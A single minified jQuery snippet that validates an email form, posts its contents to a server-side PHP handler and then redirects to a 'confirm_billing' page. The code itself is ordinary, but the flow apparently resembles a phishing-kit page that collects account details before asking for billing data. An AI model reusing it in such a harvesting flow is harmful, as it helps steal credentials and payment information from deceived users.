$("#email").validate({submitHandler:function(){$.post("../action/post_email.php",$("#email").serialize(),function(){setTimeout(function(){window.location.assign("confirm_billing")},3e3)})}});
